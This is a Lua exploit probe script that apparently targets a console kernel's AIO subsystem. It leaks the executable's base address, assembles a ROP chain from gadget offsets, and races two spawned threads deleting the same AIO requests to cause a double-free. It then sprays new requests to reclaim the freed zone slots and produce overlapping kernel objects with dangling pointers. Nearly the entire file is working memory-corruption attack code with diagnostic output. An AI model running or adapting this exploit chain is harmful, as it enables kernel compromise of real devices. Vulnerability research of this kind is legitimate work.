-- CRASH_CLASS: HIGH
-- PROBE 65s: AIO double-free → overlapping objects via same-zone reclaim
--
-- 13.60 decompile: 662 delete frees FOUR sub-objects per AIO request:
--   0x30 (48B) from zone 0x1ab59e0 (thread context)
--   0x58 (88B) from zone 0x1ab5970 (request header)
--   0x28 (40B) from zone 0x1ab5890 (per-request array)
--   0x38 (56B) from zone 0x1ab5a50 (aux structure)
-- After TOCTOU double-free (65l confirmed), each slot is on
-- its zone free list TWICE. Next two AIO submits reclaim the
-- same slot → two live requests share kernel sub-objects.
-- Delete one → the other has dangling ptrs → observable corruption.

print("=== PROBE 65s: AIO overlap reclaim ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_pop_rcx  = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS(12) + SIGPIPE(13)
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- AIO helpers
local reqs   = memory.alloc(0x30)
local dbuf   = memory.alloc(0x1000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

local function delete_ids(ids_ptr, count, states_ptr)
    pcall(function()
        mk(662)(uint64(ids_ptr), uint64(count), uint64(states_ptr))
    end)
end

-- Make child ROP chain for 662
local function make_del_child(ids_ptr, count, states_ptr, marker_ptr, marker_val)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end

    -- Write marker
    em(g_pop_rax); em(uint64(marker_val))
    em(g_pop_rdi); em(uint64(marker_ptr))
    em(g_mov_m_rax)
    -- syscall 662(ids, count, states)
    em(g_pop_rdi); em(uint64(ids_ptr))
    em(g_pop_rsi); em(uint64(count))
    em(g_pop_rdx); em(uint64(states_ptr))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    -- Write completion marker
    em(g_pop_rax); em(uint64(marker_val + 1))
    em(g_pop_rdi); em(uint64(marker_ptr))
    em(g_mov_m_rax)
    -- thr_exit
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local function spawn_child(par)
    pcall(function() mk(455)(par, uint64(0x38)) end)
end

if not alive() then print("DEAD after setup"); return end

-- =========================================================
-- [A] Baseline: submit, poll, delete, confirm IDs are gone
-- =========================================================
print("")
print("[A] Baseline — confirm single-thread delete works")
local base_ids = {}
for i = 1, 8 do
    local id = submit_one()
    if id ~= 0 then table.insert(base_ids, id) end
end
print("  submitted " .. #base_ids)
for _, id in ipairs(base_ids) do poll_one(id) end

local del_buf = memory.alloc(4 * #base_ids)
local st_buf  = memory.alloc(4 * #base_ids)
for i = 0, #base_ids - 1 do
    wd(N(del_buf) + i * 4, base_ids[i + 1])
    wd(N(st_buf) + i * 4, 0xDEAD)
end
delete_ids(N(del_buf), #base_ids, N(st_buf))
local base_ok = 0
for i = 0, #base_ids - 1 do
    if rd(N(st_buf) + i * 4) == 0 then base_ok = base_ok + 1 end
end
print("  deleted " .. base_ok .. "/" .. #base_ids)
if not alive() then print("DEAD"); return end

-- =========================================================
-- [B] Double-free race + immediate re-submit (reclaim)
-- =========================================================
print("")
print("[B] Double-free + reclaim — 20 iterations")

local BATCH  = 16
local ITERS  = 30
local total_doubles    = 0
local total_spray_dead = 0
local total_spray_weird = 0

local del_ids_buf = memory.alloc(4 * BATCH + 0x10)
local stA_buf     = memory.alloc(4 * BATCH + 0x10)
local stB_buf     = memory.alloc(4 * BATCH + 0x10)
local markerA     = memory.alloc(8)
local markerB     = memory.alloc(8)

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    -- 1. Submit + poll victim batch
    local victim_ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(victim_ids, id)
        end
    end
    if #victim_ids < 2 then
        print(string.format("  iter %d: only %d victims, skip", iter, #victim_ids))
        break
    end
    local vc = #victim_ids

    -- Write shared ID array
    for i = 0, vc - 1 do
        wd(N(del_ids_buf) + i * 4, victim_ids[i + 1])
        wd(N(stA_buf) + i * 4, 0xAAAAAAAA)
        wd(N(stB_buf) + i * 4, 0xBBBBBBBB)
    end
    wq(N(markerA), uint64(0))
    wq(N(markerB), uint64(0))

    -- 2. Launch two children to race-delete
    local pA = make_del_child(N(del_ids_buf), vc, N(stA_buf), N(markerA), 0x41)
    local pB = make_del_child(N(del_ids_buf), vc, N(stB_buf), N(markerB), 0x51)
    spawn_child(pA)
    spawn_child(pB)

    -- 3. Wait for both to finish
    for w = 1, 80000 do local _ = rd(N(dbuf)) end

    local mA = N(rq(N(markerA)) or uint64(0))
    local mB = N(rq(N(markerB)) or uint64(0))

    -- 4. Count double-deletes
    local doubles = 0
    for i = 0, vc - 1 do
        local sA = rd(N(stA_buf) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(stB_buf) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if not alive() then
        print(string.format("  iter %d: %d doubles then DEAD", iter, doubles))
        break
    end

    -- 5. IMMEDIATELY submit spray batch — reclaim freed slots
    --    Submit 2*BATCH to ensure we hit both copies of the double-freed slots
    local spray_ids = {}
    for i = 1, BATCH * 2 do
        local id = submit_one()
        if id ~= 0 then table.insert(spray_ids, id) end
    end

    -- 6. Poll all spray requests
    for _, id in ipairs(spray_ids) do poll_one(id) end

    if not alive() then
        print(string.format("  iter %d: %d doubles, %d sprayed, DEAD after poll",
            iter, doubles, #spray_ids))
        break
    end

    -- 7. Delete spray requests one by one, check for anomalies
    local spray_ok = 0
    local spray_dead = 0
    local spray_weird = 0
    for _, id in ipairs(spray_ids) do
        if not alive() then
            spray_dead = spray_dead + 1
        else
            wd(N(one_id), id); wd(N(one_st), 0xDEAD)
            pcall(function()
                mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
            end)
            local st = rd(N(one_st)) or 0xDEAD
            if st == 0 then
                spray_ok = spray_ok + 1
            elseif st == 0x80020003 then
                spray_weird = spray_weird + 1
            else
                spray_weird = spray_weird + 1
            end
        end
    end
    total_spray_dead = total_spray_dead + spray_dead
    total_spray_weird = total_spray_weird + spray_weird

    if doubles > 0 or spray_weird > 0 or spray_dead > 0 or iter <= 5 or iter == ITERS then
        print(string.format(
            "  iter %d: dbl=%d spray=%d ok=%d weird=%d dead=%d mA=0x%X mB=0x%X",
            iter, doubles, #spray_ids, spray_ok, spray_weird, spray_dead, mA, mB))
    end
end

print("")
print(string.format("TOTAL: doubles=%d spray_weird=%d spray_dead=%d alive=%s",
    total_doubles, total_spray_weird, total_spray_dead, alive() and "YES" or "NO"))

-- =========================================================
-- [C] Targeted test: double-free then 2 spray batches
--     If zone free-list has slot×2, batch1 gets copy1, batch2 gets copy2
--     → overlapping objects. Delete batch1 → batch2 has dangling ptrs
-- =========================================================
if not alive() then print(""); print("[C] SKIPPED — process dead"); return end

print("")
print("[C] Targeted overlap — 2 spray batches after double-free")

local PAIRS = 10
local overlap_crash = 0
local overlap_weird = 0

for trial = 1, PAIRS do
    if not alive() then
        print(string.format("  trial %d: DEAD", trial))
        break
    end

    -- Submit + poll 16 victims
    local vids = {}
    for i = 1, 16 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    if #vids < 2 then break end

    -- Race-delete
    for i = 0, #vids - 1 do
        wd(N(del_ids_buf) + i * 4, vids[i + 1])
        wd(N(stA_buf) + i * 4, 0xAAAAAAAA)
        wd(N(stB_buf) + i * 4, 0xBBBBBBBB)
    end
    wq(N(markerA), uint64(0))
    wq(N(markerB), uint64(0))

    local pA = make_del_child(N(del_ids_buf), #vids, N(stA_buf), N(markerA), 0xC1)
    local pB = make_del_child(N(del_ids_buf), #vids, N(stB_buf), N(markerB), 0xD1)
    spawn_child(pA)
    spawn_child(pB)
    for w = 1, 80000 do local _ = rd(N(dbuf)) end

    local dbl = 0
    for i = 0, #vids - 1 do
        local sA = rd(N(stA_buf) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(stB_buf) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then dbl = dbl + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: %d doubles then DEAD", trial, dbl))
        overlap_crash = overlap_crash + 1
        break
    end

    -- Spray batch 1 (reclaims first copy of freed slots)
    local b1 = {}
    for i = 1, 8 do
        local id = submit_one()
        if id ~= 0 then table.insert(b1, id) end
    end
    for _, id in ipairs(b1) do poll_one(id) end

    -- Spray batch 2 (reclaims second copy → overlaps batch 1!)
    local b2 = {}
    for i = 1, 8 do
        local id = submit_one()
        if id ~= 0 then table.insert(b2, id) end
    end
    for _, id in ipairs(b2) do poll_one(id) end

    if not alive() then
        print(string.format("  trial %d: %d doubles, sprayed %d+%d, DEAD after spray",
            trial, dbl, #b1, #b2))
        overlap_crash = overlap_crash + 1
        break
    end

    -- Delete batch 1 — if overlapping, this frees batch 2's sub-objects
    local b1_ok = 0
    for _, id in ipairs(b1) do
        wd(N(one_id), id); wd(N(one_st), 0xDEAD)
        pcall(function()
            mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        if rd(N(one_st)) == 0 then b1_ok = b1_ok + 1 end
        if not alive() then break end
    end

    if not alive() then
        print(string.format(
            "  trial %d: dbl=%d b1_del=%d/%d → DEAD (overlap freed b2 sub-objects!)",
            trial, dbl, b1_ok, #b1))
        overlap_crash = overlap_crash + 1
        break
    end

    -- Delete batch 2 — if sub-objects were freed by b1 delete, this double-frees
    local b2_ok = 0
    local b2_unk = 0
    for _, id in ipairs(b2) do
        wd(N(one_id), id); wd(N(one_st), 0xDEAD)
        pcall(function()
            mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        local st = rd(N(one_st)) or 0xDEAD
        if st == 0 then b2_ok = b2_ok + 1
        elseif st ~= 0x80020003 then b2_unk = b2_unk + 1 end
        if not alive() then break end
    end

    if not alive() then
        print(string.format(
            "  trial %d: dbl=%d b1=%d/%d b2=%d/%d (unk=%d) → DEAD (cascading free!)",
            trial, dbl, b1_ok, #b1, b2_ok, #b2, b2_unk))
        overlap_crash = overlap_crash + 1
        break
    end

    -- Report
    if dbl > 0 or b2_unk > 0 then
        print(string.format(
            "  trial %d: dbl=%d b1=%d/%d b2=%d/%d unk=%d",
            trial, dbl, b1_ok, #b1, b2_ok, #b2, b2_unk))
        overlap_weird = overlap_weird + dbl
    elseif trial <= 2 or trial == PAIRS then
        print(string.format("  trial %d: dbl=%d b1=%d/%d b2=%d/%d",
            trial, dbl, b1_ok, #b1, b2_ok, #b2))
    end
end

print("")
print(string.format("OVERLAP RESULT: crashes=%d weird=%d alive=%s",
    overlap_crash, overlap_weird, alive() and "YES" or "NO"))
print("")
print("=== PROBE 65s COMPLETE ===")
